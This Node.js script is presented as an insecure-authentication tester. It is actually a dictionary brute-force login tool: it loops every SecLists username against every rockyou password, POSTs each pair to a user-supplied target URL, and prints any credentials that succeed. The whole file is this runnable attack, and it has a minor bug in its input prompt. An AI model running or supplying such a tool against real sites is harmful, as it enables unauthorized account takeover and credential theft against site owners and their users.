const fetch = require('node-fetch');
const readline = require('readline');
const fs = require('fs');
const zlib = require('zlib');

// Function to perform login over HTTP
async function testInsecureAuthentication(url, username, password) {
    try {
        const response = await fetch(url, {
            method: 'POST',
            body: JSON.stringify({ username, password }),
            headers: {
                'Content-Type': 'application/json'
            }
        });

        if (response.status === 200) {
            console.log('\x1b[32m', 'Vulnerability Detected: Insecure Authentication');
            console.log('\x1b[33m', 'You have successfully logged in over HTTP. Your credentials may have been exposed.');
            console.log('\x1b[37m', 'Username:', username);
            console.log('\x1b[37m', 'Password:', password);
        } else {
            console.log('\x1b[32m', 'No vulnerability detected. The server responded with:', response.status, response.statusText);
        }
    } catch (error) {
        console.error('\x1b[31m', 'Error:', error.message);
    }
}

// Function to get user input
function getUserInput(prompt) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    return new Promise((resolve) => {
        rl.question(prompt, (answer) => {
            rl.close();
            resolve(answer);
        });
    });
}

// Function to read usernames from file
function readUsernamesFromFile(filePath) {
    return new Promise((resolve, reject) => {
        const stream = fs.createReadStream(filePath, { encoding: 'utf8' });
        const rl = readline.createInterface({
            input: stream,
            crlfDelay: Infinity
        });
        const usernames = [];

        rl.on('line', (line) => {
            usernames.push(line.trim());
        });

        rl.on('close', () => {
            resolve(usernames);
        });

        rl.on('error', (err) => {
            reject(err);
        });
    });
}

// Function to read passwords from gzipped file
function readPasswordsFromFile(filePath) {
    return new Promise((resolve, reject) => {
        const stream = fs.createReadStream(filePath);
        const gunzip = zlib.createGunzip();
        const rl = readline.createInterface({
            input: stream.pipe(gunzip),
            crlfDelay: Infinity
        });
        const passwords = [];

        rl.on('line', (line) => {
            passwords.push(line.trim());
        });

        rl.on('close', () => {
            resolve(passwords);
        });

        rl.on('error', (err) => {
            reject(err);
        });
    });
}

// Main function
async function main() {
    console.log('\x1b[36m', 'Welcome to the Insecure Authentication Vulnerability Tester');
    console.log('\x1b[36m', 'Enter your target website URL:');
    const targetWebsite = await getUserInput('\x1b[35m', 'Enter your target website URL: ');

    console.log('\x1b[36m', 'Reading usernames from file...');
    const usernames = await readUsernamesFromFile('/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt');

    console.log('\x1b[36m', 'Reading passwords from gzipped file...');
    const passwords = await readPasswordsFromFile('/usr/share/wordlists/rockyou.txt.gz');

    console.log('\x1b[36m', 'Testing Insecure Authentication...');
    for (let username of usernames) {
        for (let password of passwords) {
            console.log('\x1b[36m', 'Testing username:', username, 'with password:', password);
            await testInsecureAuthentication(targetWebsite, username, password);
        }
    }
}

// Run the main function
main();
